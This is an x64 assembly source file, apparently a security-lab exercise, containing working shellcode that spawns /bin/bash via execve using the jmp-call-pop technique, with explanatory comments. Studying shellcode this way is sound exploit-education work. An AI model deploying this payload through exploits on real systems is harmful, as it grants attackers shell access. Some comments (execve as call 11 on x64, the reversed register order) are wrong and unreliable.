; For the x64 architecture, invoking system call is done through the syscall instruction, 
;- and the first three arguments for the system call are stored in the
;   - rdx, rsi, rdi registers, respectively.
; rax --> must contain 11, which is the system call number for execve()
; rdi --> address of command --> address
; rsi --> address of argv[] --> address
; rdx --> address of arge[] --> 0

; in 32 bit we have:
; eax --> must contain 11, which is the system call number for execve()
; ebx --> address of the command
; ecx --> address of argv[]
; edx --> address of arge[]




; nasm -f elf64 3_1_new.s -o 3_1_new.o && ld --omagic 3_1_new.o -o 3_1_new && 3_1_new


section .text
global _start
_start:
    BITS 64
    jmp short two
one:
    ; The following code calls execve("/bin/bash")
    pop rsi ; recover from the stack the return address

    ; add the zeros
    xor rax, rax            ;Zero out eax
    mov [rsi+9], al
    mov [rsi+18], rax ; set BBBBBBBB as argv[1] = NULL

    ; rdi -->command
    mov rdi, rsi

    ; move the instruction to AAAAAAAA as argv[0]
    mov[rsi+10], rsi
    lea rsi, [rsi+10] ; --> argv[] pointer

    ;set arge[] NULL
    ; rdx --> arge[]
    xor rdx, rdx

    ; set the 11 code for execve() in rax
    xor rax, rax
    mov rax, 0x3b ; 0x3b == 59 --> execve()
    syscall

two:
    call one ; add the return address(db) into the stack and call the routine one
    db "/bin/bash*AAAAAAAABBBBBBBB"

; 0 /
; 1 b
; 2 i
; 3 n
; 4 /
; 5 b
; 6 a
; 7 s
; 8 h
; 9 *
; 10 A
; 11 A
; 12 A
; 13 A
; 14 A
; 15 A
; 16 A
; 17 A
; 18 B
; 19 B
; 20 B
; 21 B
; 22 B
; 23 B
; 24 B
; 25 B